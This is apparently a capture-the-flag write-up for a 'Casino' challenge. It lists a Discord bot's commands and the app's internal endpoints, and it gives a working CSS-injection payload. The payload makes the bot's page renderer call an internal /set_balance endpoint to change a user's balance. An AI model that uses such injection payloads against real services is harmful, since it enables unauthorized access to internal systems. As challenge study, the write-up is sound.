# Casino

Make $1,000 off the Discord bot, $help to view commands.

## Web Application

### /
### /badge
### /rich
### /balance
### /add_user (internal network only)
### /set_balance (internal network only)

## Bot

```
> $help
Website: http://35.224.135.84:3000/
$balance
$beg
$bet (accepts input of how much)
$rich
$badge (accepts input of CSS?!)
$flag
```

### $badge command CSS/XSS Injection

It accepts CSS as input in multiple forms, adds it to URL params
and then visits the page and screenshots it. We can probably XSS
our way in and make requests to the internal API.

edit: yes, yes we can. exploit below to set arbitrary balances

```
$badge `#badge { background: url('http://172.16.0.10:3000/set_balance?user=constarr%238990&balance=1337') }`
```
